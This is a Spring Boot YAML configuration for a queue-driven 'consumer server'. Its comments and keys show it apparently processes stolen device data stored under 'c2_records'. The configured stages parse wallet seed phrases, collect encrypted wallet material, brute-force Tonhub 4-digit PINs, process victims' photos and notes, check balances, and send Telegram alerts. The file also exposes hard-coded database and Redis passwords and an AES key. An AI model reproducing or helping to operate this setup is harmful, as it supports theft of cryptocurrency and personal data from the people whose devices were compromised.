server:
  port: 8106
  max-http-header-size: 2MB
  connection-timeout: 10s
  tomcat:
    max-http-form-post-size: 50MB
    max-swallow-size: 10MB
    threads:
      max: 50
      min-spare: 5
    max-connections: 500
    accept-count: 100
  compression:
    enabled: true
    mime-types: application/json,application/xml,text/html,text/plain
    min-response-size: 1024

spring:
  application:
    name: 18-consumer-server
  cloud:
    nacos:
      discovery:
        server-addr: http://127.0.0.1:8848
        #namespace: a5b3bd13-9c96-4216-93fb-8b077e537f46 #测试1
        #namespace: 0e71ca2d-2a33-48c1-922a-5d388210e675 #测试2
        namespace: 31ee03b7-c6df-436d-990d-d6c08aa5c20a #开发
  mvc:
    pathmatch:
      matching-strategy: ant_path_matcher
  servlet:
    multipart:
       max-file-size: 500MB
       max-request-size: 500MB
  jackson:
    date-format: yyyy-MM-dd HH:mm:ss
    time-zone: GMT+8

  redis:
    host: 127.0.0.1
    port: 6379
    password: 123456
    database: 0
    timeout: 5000ms
    lettuce:
      pool:
        max-active: 32
        max-idle: 16
        min-idle: 4
        max-wait: 5000ms
    jedis:
      pool:
        max-active: 32
        max-idle: 16
        min-idle: 4

  datasource:
    driver-class-name: com.mysql.cj.jdbc.Driver
    url: jdbc:mysql://127.0.0.1:3306/ioslianjie?useUnicode=true&characterEncoding=utf-8&serverTimezone=GMT%2B8
    username: root
    password: Root@123
    #url: jdbc:mysql://127.0.0.1:3306/ioslianjie?useUnicode=true&characterEncoding=utf-8&serverTimezone=GMT%2B8
    #username: ioslianjie
    #password: BAF4R22mwenXXxEH
    type: com.alibaba.druid.pool.DruidDataSource
    initialSize: 10
    minIdle: 10
    maxActive: 56
    maxWait: 5000
    timeBetweenEvictionRunsMillis: 30000
    minEvictableIdleTimeMillis: 50000
    validationQuery: SELECT 1
    testWhileIdle: true
    testOnBorrow: false
    testOnReturn: false
    connectionErrorRetryAttempts: 3
    breakAfterAcquireFailure: false

consumer:
  # 落盘根
  upload-dir: D:/c2_records
  #upload-dir: /opt/news4/data/apilog
  #图片落盘位置
  photo-dir: D:/c2_records/photos
  #photo-dir: /opt/news4/data/photos
  photo-url-prefix: data/photos
  #钱包加密数据落盘位置
  waitbound-dir: "D:/c2_records/waitbound"
  #waitbound-dir: /opt/news4/data/waitbound
  waitbound-task-enabled: true #是否开启加密信息收集
  waitbound-threads: 2
  waitbound-poll-interval-ms: 800
  waitbound-claim-idle-ms: 900000
  waitbound-batch-size: 4
  tonhub-task-enabled: true  #是否开启Tonhub PIN 爆破旁路队列
  tonhub-threads: 1
  tonhub-poll-interval-ms: 500
  tonhub-claim-idle-ms: 1800000
  tonhub-batch-size: 1
  # sandbox 全目录 BIP39 兜底扫描（metamask 等）默认关
  sandbox-fallback-regex-enabled: false
  main-threads: 4
  parse-ci-threads: 6
  auto-claim-idle-ms: 1800000
  main-claim-idle-ms: 600000
  max-attempts: 5
  retry-backoff-base-ms: 1000
  dlq-retention-ms: 604800000
  # 助记词 AES 密钥：留空或空字符串 → mnemonic.result 明文入库
  mnemonic-aes-key: "Mn3m0n1c@2024!SecureKey#news2"
  news4-task-enabled: true
  news4-threads: 8
  news4-poll-interval-ms: 300
  news4-claim-idle-ms: 600000
  photo-threads: 3
  photo-poll-interval-ms: 500
  photo-claim-idle-ms: 600000
  photo-batch-size: 16
  nb-notestore-threads: 3
  nb-notestore-poll-interval-ms: 800
  nb-notestore-claim-idle-ms: 900000
  nb-notestore-batch-size: 8
  batch-size: 16
  parse-ci-batch-size: 8
  news4-batch-size: 24
  poll-interval-ms: 200
  parse-ci-poll-interval-ms: 400
  consumer-name:
  tonhub-brute-sync-timeout-ms: 0
  tonhub-brute-threads: 0
  tonhub-brute-serialize: true
  tonhub-brute-serialize-permits: 1
  trust-decrypt-async: true
  trust-decrypt-threads: 2
  trust-decrypt-serialize-permits: 2
  poll-queue-high-ratio: 0.5
  crypto-defer-max-attempts: 120
  crypto-defer-base-delay-ms: 3000

# =============================================================================
# 【换另一套时必改】Redis 队列隔离（本机多套同 Redis 时防串消费）
# =============================================================================
queue:
  prefix: "suite-a"                          # 【换套改这里】例：suite-a / suite-b；
  # ---------- Stream（任务流）----------
  # 主任务
  stream-main: api18:tasks
  # 助记词解析
  stream-parse-ci: api18:tasks:parse_ci
  # 相册/图片
  stream-photo: api18:tasks:photo
  # 备忘录
  stream-nb-notestore: api18:tasks:nb_notestore
  # 未解出钱包加密材料落盘
  stream-waitbound: api18:tasks:waitbound
  # Tonhub 4 位 PIN 爆破
  stream-tonhub: api18:tasks:tonhub
  # 地址派生、余额等
  stream-news4: news4:tasks

  # ---------- Consumer Group（消费组，也会带 prefix）----------
  group-main: api18-workers                  # 消费 stream-main
  group-parse-ci: api18-parse-ci             # 消费 stream-parse-ci
  group-news4: news4-workers                 # 消费 stream-news4
  group-photo: api18-photo-workers           # 消费 stream-photo
  group-nb-notestore: api18-nb-notestore     # 消费 stream-nb-notestore
  group-waitbound: api18-waitbound           # 消费 stream-waitbound
  group-tonhub: api18-tonhub                 # 消费 stream-tonhub

  # ---------- DLQ（死信，超 max-attempts 进入；定期按 dlq-retention-ms 清理）----------
  dlq-main: api18:tasks:dead
  dlq-parse-ci: api18:tasks:parse_ci:dead
  dlq-news4: news4:tasks:dead
  dlq-photo: api18:tasks:photo:dead
  dlq-nb-notestore: api18:tasks:nb_notestore:dead
  dlq-waitbound: api18:tasks:waitbound:dead
  dlq-tonhub: api18:tasks:tonhub:dead

# news4 旁路线程池（与 n4-worker 隔离；listen / balance 互不堵塞）
news4:
  listen-pool:
    core-size: 6
    max-size: 12
    queue-capacity: 10000
  balance-pool:
    core-size: 6
    max-size: 16
    queue-capacity: 10000

#飞机消息线程池（突发时队列加大；并发仍限流防刷爆 TG）
telegram-msg-stream:
  async-pool:
    core-size: 4
    max-size: 12
    queue-capacity: 10000
    keep-alive-seconds: 60

